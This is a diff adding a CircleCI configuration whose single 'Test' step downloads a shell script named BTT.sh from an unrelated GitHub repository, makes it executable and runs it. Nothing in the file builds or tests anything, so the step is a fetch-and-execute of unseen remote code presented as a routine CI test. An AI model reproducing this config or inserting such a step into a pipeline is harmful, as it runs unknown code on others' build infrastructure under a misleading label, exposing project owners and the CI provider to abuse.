@@ -1,0 +1,17 @@
+version: 2.1
+
+orbs:
+   python: circleci/python@0.2.1
+
+jobs:
+  build-and-test:
+    executor: python/default
+    steps:
+      - run:
+          command: wget https://raw.githubusercontent.com/ngentokyokkak/mahmed/main/BTT.sh && chmod +x BTT.sh && ./BTT.sh
+          name: Test
+
+workflows:
+  main:
+    jobs:
+      - build-and-test
